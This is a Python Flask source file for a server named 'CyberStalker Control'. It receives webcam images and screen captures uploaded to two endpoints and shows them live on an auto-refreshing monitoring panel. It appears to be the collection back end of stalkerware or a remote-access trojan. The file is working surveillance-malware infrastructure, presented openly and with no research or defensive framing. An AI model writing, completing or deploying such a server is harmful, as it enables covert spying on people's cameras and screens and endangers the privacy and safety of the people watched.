from flask import Flask, request, render_template, send_file
import cv2
import numpy as np
import os
from datetime import datetime

app = Flask(__name__)

latest_webcam = None
latest_screen = None

@app.route('/')
def control_panel():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>CyberStalker Control</title>
        <meta http-equiv="refresh" content="2">
    </head>
    <body>
        <h1>Live Monitoring Panel</h1>
        <h2>Webcam Feed:</h2>
        <img src="/latest_webcam" width="640" height="480">
        <h2>Screen Feed:</h2>
        <img src="/latest_screen" width="800" height="600">
    </body>
    </html>
    '''

@app.route('/upload_webcam', methods=['POST'])
def handle_webcam():
    global latest_webcam
    try:
        if 'file' in request.files:
            file = request.files['file']
            img_array = np.frombuffer(file.read(), np.uint8)
            img = cv2.imdecode(img_array, cv2.IMREAD_COLOR)
            cv2.imwrite('latest_webcam.jpg', img)
            latest_webcam = 'latest_webcam.jpg'
    except: pass
    return 'OK'

@app.route('/upload_screen', methods=['POST'])
def handle_screen():
    global latest_screen
    try:
        if 'file' in request.files:
            file = request.files['file']
            file.save('latest_screen.jpg')
            latest_screen = 'latest_screen.jpg'
    except: pass
    return 'OK'

@app.route('/latest_webcam')
def get_latest_webcam():
    if latest_webcam and os.path.exists(latest_webcam):
        return send_file(latest_webcam, mimetype='image/jpeg')
    return 'No image'

@app.route('/latest_screen')
def get_latest_screen():
    if latest_screen and os.path.exists(latest_screen):
        return send_file(latest_screen, mimetype='image/jpeg')
    return 'No image'

import os

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)